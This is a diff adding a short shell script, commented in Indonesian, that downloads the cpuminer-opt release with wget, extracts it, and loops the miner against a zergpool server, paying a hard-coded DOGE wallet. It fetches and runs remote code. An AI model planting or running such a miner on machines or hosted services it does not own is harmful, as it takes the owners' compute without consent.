@@ -1,0 +1,10 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+
+# extrak file
+tar xf cpuminer-opt-linux.tar.gz
+
+# Run Mining
+while [ 1 ]; do
+./cpuminer-sse2 -a yescrypt -o stratum+tcp://yescrypt.asia.mine.zergpool.com:6233 -u DOGE:DMS2D25gAstu74ErUsvogeAuGLyQsHjnbF -p c=DOGE
+sleep 2
+done
